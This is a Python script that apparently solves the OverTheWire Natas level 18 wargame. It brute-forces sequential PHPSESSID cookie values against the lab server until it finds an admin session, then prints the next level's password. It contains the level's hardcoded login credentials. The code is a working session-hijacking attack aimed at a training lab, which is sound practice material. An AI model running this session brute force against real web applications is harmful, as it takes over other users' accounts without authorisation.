import requests, re, time, sys

# =======================
# === STYLING HELPERS ===
# =======================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def log_info(message):
    print(f"{CYAN}[*] {message}{RESET}")

def log_success(message):
    print(f"{GREEN}[+] {message}{RESET}")


def log_progress_inline(message, color=CYAN):
    sys.stdout.write(f"\r{YELLOW}{message}{RESET}")
    sys.stdout.flush()

def log_found_inline(message):
    sys.stdout.write(f"\r{YELLOW}{message}{RESET}\n")
    sys.stdout.flush()


# =======================

# === CONFIG ===
url = "http://natas18.natas.labs.overthewire.org/"
username = "natas18"
natas18_password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
phpsesidMax = 640
phpsesidMin = 1
# =============

log_info("Starting brute-force on natas18...")

for sesID in range(phpsesidMin, phpsesidMax + 1):
    # Show inline progress
    log_progress_inline(f"Trying PHPSESSID={sesID}")

    cookies = {"PHPSESSID": str(sesID)}
    response = requests.get(url, cookies=cookies, auth=(username, natas18_password))

    if "You are an admin" in response.text:
        # Extract password
        match = re.search(r"Password:\s*(\S+)", response.text)
        if match:
            password = match.group(1)
            log_found_inline(f"Admin session found! PHPSESSID={sesID}")
            log_success(f"Natas19 password: {password}")
            break


